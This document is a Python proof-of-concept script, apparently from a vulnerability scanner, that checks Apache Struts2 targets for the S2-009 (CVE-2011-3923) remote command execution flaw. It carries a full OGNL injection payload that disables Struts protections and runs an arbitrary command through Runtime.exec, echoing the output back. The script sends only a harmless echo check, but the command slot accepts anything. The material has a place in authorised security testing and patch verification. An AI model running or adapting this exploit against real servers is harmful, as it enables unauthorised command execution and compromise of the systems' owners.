#!/usr/bin/env python3

import urllib
import random
import string
import requests

class S2_009_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-009漏洞,又名CVE-2011-3923漏洞',
            'description': 'Struts2 S2-009漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.1',
            'date': '2012-01-20',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if  '.action' not in self.url:
            self.url = self.url + '/ajax/example5.action'
        self.capta = self.get_capta() 
        self.payload =  '?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27{cmd}%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'
       
    def filter(self, check_str):

        """
        过滤无用字符

        :param str check_str:待过滤的字符串

        :return str temp:过滤后的字符串
        """
        
        temp = ''
        for i in check_str:
            if i != '\n' and i != '\x00':
                temp = temp + i
        return temp
    
    def get_capta(self):
        """
        获取一个随机字符串

        :param:

        :return str capta: 生成的字符串
        """
        capta = ''
        words = ''.join((string.ascii_letters,string.digits))
        for i in range(8):
            capta = capta + random.choice(words)
        return capta

    def run(self):

        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """

        try:
            check_url = self.url + self.payload.format(cmd = urllib.parse.quote(('echo' + ' ' + self.capta), 'utf-8'))
            check_res = requests.get(check_url)
            check_str = self.filter(list(check_res.text))
            if check_res.status_code == 200 and len(check_str) < 100 and self.capta in check_str:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_009 = S2_009_BaseVerify('http://127.0.0.1:8080')
    S2_009.run()